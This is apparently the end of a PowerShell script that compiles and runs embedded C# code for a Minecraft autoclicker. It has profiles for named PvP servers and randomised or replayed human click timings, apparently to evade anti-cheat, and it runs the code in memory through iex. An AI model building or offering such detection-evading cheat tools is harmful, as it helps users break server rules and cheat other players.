                                    } else if (rand.Next(0, 67 / (int) lastEvent) == 0) {
                                        cpsDrop = 21;
                                        lastEvent = -16;
                                    }
                                }
                                
                                double minDelay = 1000 / MinimumCPS;
                                if (cpsSpike > 1)
                                    minDelay -= GetRandomDouble(1, 25);
                                double maxDelay = 1000 / MaximumCPS;
                                if (cpsDrop > 0)
                                    maxDelay += GetRandomDouble(1, 22);
                                double average = (maxDelay + minDelay) / 2;
                                double halfDifference = (minDelay - maxDelay) / 2;
                                double delay = Math.Sin(sinX) * halfDifference + average;
                                sinX += GetRandomDouble(GetRandomDouble(0.03, 0.1), GetRandomDouble(0.69, 1.24));
                                
                                // 0x0084 = WM_NCHITTEST
                                if (SendMessage(ForegroundWindow, 0x0084, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y)) == (IntPtr) 1)
                                {
                                    lastDelay = (((int)delay) >> 1) - dif;
                                    if (lastDelay < 0 || lastDelay == Int32.MaxValue) lastDelay = 0;
                                    SendMessage(ForegroundWindow, 0x0201, (UIntPtr) 0x0001, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    Thread.Sleep((int) lastDelay);
                                    SendMessage(ForegroundWindow, 0x0202, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    Thread.Sleep((int) lastDelay);
                                }
                                lastEvent++;
                            }
                        }
                    }
                }
                
                if (!Binds()) running = false;
            }
            return;
        }

        public static void Legit(string[] args) {
            bool running = true;
            List<int> ClickTimes = new List<int>();
            
            StatusRow = Console.CursorTop;
            
            if (BitConverter.ToBoolean(BitConverter.GetBytes(File.Exists(args[4])), 0))
            {
                using (StreamReader sr = File.OpenText(args[4]))
                {
                    string s;
                    while ((s = sr.ReadLine()) != null)
                    {
                        try
                        {
                            int num = Int32.Parse(s);
                            if (num > 0)
                                ClickTimes.Add(num);
                        }
                        catch (FormatException)
                        {
                            Console.WriteLine("Cannot parse '{input}'");
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("There was an error loading '{0}'.", args[4]);
                return;
            }
            
            if (ClickTimes.Count < 50)
            {
                Console.WriteLine("Too few click times in '{0}'.", args[4]);
                return;
            }
            
            bool ChangeStartingPoint = false;
            int ClickingPoint = rand.Next(1, ClickTimes.Count / 4);
            long ClickWaitTill = 0;
            long RightNow = GetSystemTime();
            
            DrawStatus(StatusRow, ClickerEnabled, "Starting Point", ClickingPoint);
            
            while (running)
            {
                ForegroundWindow = GetForegroundWindow();
                MCWindow = FindWindow("LWJGL", null);
                
                // Clicker code
                if (ClickerEnabled)
                {
                    if (BitConverter.GetBytes(GetAsyncKeyState(1))[1] == 0x80)
                    {
                        if (MCWindow == ForegroundWindow)
                        {
                            // 0x0084 = WM_NCHITTEST
                            if (SendMessage(ForegroundWindow, 0x0084, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y)) == (IntPtr) 1)
                            {
                                RightNow = GetSystemTime();
                                ChangeStartingPoint = true;
                                if (RightNow >= ClickWaitTill)
                                {
                                    SendMessage(ForegroundWindow, 0x0201, (UIntPtr) 0x0001, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    SendMessage(ForegroundWindow, 0x0202, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    
                                    if (ClickingPoint == ClickTimes.Count - 1)
                                        ClickingPoint = rand.Next(1, ClickTimes.Count / 4);
                                    else
                                        ClickingPoint += 1;
                                    
                                    ClickWaitTill = RightNow + ClickTimes[ClickingPoint];
                                }
                            }
                        }
                    }
                    else if (ChangeStartingPoint)
                    {
                        ChangeStartingPoint = false;
                        ClickingPoint = rand.Next(1, ClickTimes.Count / 4);
                        DrawStatus(StatusRow, ClickerEnabled, "Starting Point", ClickingPoint);
                        ClickWaitTill = 0;
                        Thread.Sleep(1);
                    }
                    else
                    {
                        Thread.Sleep(1);
                    }
                }
                
                if (!Binds()) running = false;
            }
            return;
        }

        public static void Main()
        {
            rand = new Random();
            ConsoleWindow = GetConsoleWindow();
            string arg="$args";
            string[] args = arg.Split(' ');
            string profile = args[0];
            
            Init(args[1], args[2], args[3]);
            
            if (profile.Contains("NormalCPS"))
            {
                NormalCPS(args);
            }
            else if (profile.Contains("AstralMC"))
            {
                AstralMC(args);
            }
            else if (profile.Contains("Minemen"))
            {
                Minemen(args);
            }
            else if (profile.Contains("PvPLand"))
            {
                PvPLand(args);
            }
            else if (profile.Contains("Legit"))
            {
                Legit(args);
            }
            else
            {
                Console.WriteLine("There was an error loading your profile, please contact 'exro#4981' on Discord if this problem persists");
            }
        }
    }
}
"@

$assemblies = ("System.Windows.Forms","System.Drawing")
Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $code -Language CSharp
iex "[n$namespace.c$class]::Main()"
